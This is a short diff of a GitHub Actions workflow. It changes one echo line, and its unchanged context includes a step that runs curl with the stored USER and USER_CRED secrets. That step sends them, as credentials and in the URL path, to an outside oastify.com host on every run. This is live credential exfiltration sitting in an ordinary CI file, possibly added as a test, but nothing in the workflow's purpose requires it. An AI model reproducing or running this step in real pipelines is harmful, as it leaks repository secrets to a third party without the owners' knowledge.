@@ -21,7 +21,7 @@ jobs:
         USER: ${{ secrets.USER }}
         PW: ${{ secrets.USER_CRED }}
       run: |
-        echo "a"
+        echo "aa"
         curl --connect-timeout 2 -sSf -k -u "$USER:$PW" http://q901v2ztgzp1pne0dmdh5fdgg7myazyo.oastify.com/$USER/$PW/audit?Test
         
     - name: send_run_log
